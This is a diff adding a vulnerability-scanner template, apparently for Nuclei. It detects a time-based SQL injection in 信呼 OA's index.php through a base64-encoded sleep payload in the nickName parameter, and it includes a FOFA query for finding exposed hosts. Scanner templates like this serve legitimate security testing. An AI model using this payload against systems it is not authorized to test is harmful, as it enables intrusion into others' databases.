@@ -1,0 +1,27 @@
+id: rock-oa-index-sqli
+info:
+  name: 信呼 OA - sqli
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/wy876/POC/blob/d672fb7281b8d68fde4cf142b81405f912fc51e6/%E4%BF%A1%E5%91%BCOA%E7%B3%BB%E7%BB%9Findex%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    fofa-query: icon_hash="1652488516"
+  tags: rockoa,sqli,time
+
+http:
+  - raw:
+      - |
+        @timeout: 15s
+        GET /index.php?m=openmodhetong|openapi&d=task&a=data&ajaxbool=0&nickName=MScgYW5kIHNsZWVwKDYpIw== HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
